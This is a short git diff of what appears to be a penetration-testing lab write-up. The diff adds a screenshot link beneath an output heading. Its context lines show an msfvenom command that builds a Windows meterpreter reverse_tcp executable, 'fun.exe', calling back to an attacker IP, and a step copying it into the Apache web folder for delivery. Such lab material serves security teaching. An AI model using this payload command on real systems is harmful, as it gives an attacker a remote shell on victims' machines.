@@ -30,6 +30,7 @@ Find the attackers ip address using ifconfig
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
+<img width="723" height="133" alt="image" src="https://github.com/user-attachments/assets/6902cdda-455a-4df9-9f4d-846969dfe402" />
 
 
 copy the fun.exe into the apache /var/www/html folder
